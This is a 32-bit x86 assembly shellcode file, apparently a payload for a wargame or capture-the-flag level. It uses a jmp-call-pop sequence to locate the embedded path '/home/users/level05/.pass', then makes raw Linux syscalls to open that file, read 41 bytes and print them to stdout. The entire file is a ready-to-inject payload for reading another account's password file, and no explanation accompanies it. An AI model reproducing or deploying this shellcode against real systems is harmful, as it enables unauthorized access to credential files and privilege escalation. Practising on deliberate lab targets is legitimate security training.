BITS 32

section .text
	global _start

_start:
	jmp short push_filename
	
shellcode:
	xor eax, eax
	xor ebx, ebx
	xor ecx, ecx
	xor edx, edx

	mov al, 5	;	open syscall
	pop ebx
	int 0x80

	mov esi, eax	;	save fd given by open syscall
	mov ecx, ebx	;	move buffer for read

	xor eax, eax
	mov ebx, esi
	mov al, 3	;	read syscall
	sub esp, 41	;	extend stack for read byte
	lea ecx, [esp]	;	load address of this buffer
	mov dl, 41
	int 0x80

	xor ebx, ebx
	mov al, 4	;	write syscall
	mov bl, 1	;	stdout
	int 0x80

	xor eax, eax
	mov al, 1	;	exit syscall
	xor ebx, ebx	;	exit code arg
	int 0x80

push_filename:
	call shellcode
	db "/home/users/level05/.pass"